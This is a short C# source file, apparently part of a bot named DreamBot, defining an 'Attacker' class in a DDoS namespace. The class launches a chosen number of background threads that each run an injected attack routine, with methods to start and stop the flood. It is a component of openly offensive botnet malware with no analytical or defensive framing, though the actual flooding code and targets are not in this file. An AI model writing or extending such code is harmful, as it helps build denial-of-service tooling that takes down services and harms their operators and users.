using System.ComponentModel;

namespace DreamBot.Actions.DDoS
{
    class Attacker
    {
        private readonly BackgroundWorker[] _threads;

        public Attacker(int threadCount, Attack attack)
        {
            _threads = new BackgroundWorker[threadCount];

            for (var i = 0; i < threadCount; i++)
            {
                _threads[i] = new BackgroundWorker();
                _threads[i].DoWork += attack.Run;
                _threads[i].WorkerSupportsCancellation = true;
            }
        }

        public void Start()
        {
            foreach (var worker in _threads)
            {
                worker.RunWorkerAsync();
            }
        }

        public void Stop()
        {
            foreach (var worker in _threads)
            {
                try
                {
                    worker.CancelAsync();
                    worker.Dispose();
                }
                catch { }
            }
        }
    }
}